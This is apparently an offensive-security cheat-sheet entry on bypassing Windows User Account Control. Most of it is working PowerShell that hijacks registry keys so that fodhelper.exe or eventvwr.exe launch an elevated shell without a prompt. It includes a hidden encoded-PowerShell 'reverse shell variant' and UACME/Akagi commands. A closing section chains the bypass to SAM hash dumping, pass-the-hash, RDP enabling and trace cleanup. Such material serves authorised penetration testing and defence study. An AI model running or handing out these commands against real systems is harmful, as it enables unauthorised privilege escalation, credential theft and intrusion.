---
id: windows-uac-bypass
title: UAC Bypass
stage: privesc
tags: [windows]
summary: Elevate from medium to high integrity without a UAC prompt by hijacking COM object registry keys — requires being in the local Administrators group already.
leads_to:
  - system-shell
  - token-impersonation
---

## Prerequisites

A shell in the local Administrators group but at **medium** integrity (UAC not yet bypassed). `whoami /groups` must show `Medium Mandatory Level`. These techniques do NOT escalate from a standard user to admin — they bypass the UAC prompt for accounts already in the Administrators group.

UAC bypass techniques hijack COM object resolution by writing to `HKCU\Software\Classes\` — a registry hive writable by any user without elevation. Auto-elevating Windows binaries like `fodhelper.exe` check this user-controlled hive before system defaults, executing whatever you put there at high integrity. After bypass, your token integrity changes from Medium to High, unlocking operations like SAM dump and RDP enable.

## Quick Win

> Check integrity level first, then run fodhelper bypass — works on Windows 10 and 11.

```powershell
whoami /groups | findstr "Mandatory Label"
# Medium Mandatory Level = bypass needed

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(default)" "cmd /c start cmd.exe" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "DelegateExecute" "" -Force
Start-Process fodhelper.exe
```

## Check UAC Level

> UAC level 5 (default) is bypassable — 2 requires credentials, 0 means already unrestricted.

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = no prompt (already bypassed)
# 2 = prompt for credentials (bypass won't help)
# 5 = prompt for consent (default) ← bypassable with these techniques
```

## Fodhelper Bypass (Windows 10/11)

> Writes to HKCU ms-settings key — fodhelper reads it and executes your payload elevated.

```powershell
# Reverse shell variant
$cmd = "powershell -nop -w hidden -enc BASE64_PAYLOAD"
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(default)" $cmd -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "DelegateExecute" "" -Force
Start-Process fodhelper.exe

# Clean up after
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

## Eventvwr Bypass (Windows 7–10)

> Writes to HKCU mscfile key — eventvwr.exe reads it and elevates automatically.

```powershell
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" "(default)" "cmd /c start cmd.exe" -Force
Start-Process eventvwr.exe
```

## UACME / Akagi (60+ Techniques)

> Comprehensive toolkit indexed by Windows build — use when fodhelper/eventvwr are patched.

```powershell
.\Akagi64.exe 23 C:\Windows\System32\cmd.exe   # method 23 = fodhelper
.\Akagi64.exe 41 "powershell -enc BASE64"       # method 41 = compmgmtlauncher
```

## Leads To

High integrity shell → `whoami /priv` shows SeImpersonatePrivilege now usable → token-impersonation → SYSTEM. High integrity → dump SAM hashes → pass-the-hash laterally. High integrity → enable RDP (`netsh` or registry) → RDP in as admin. Always clean up registry keys after exploitation.
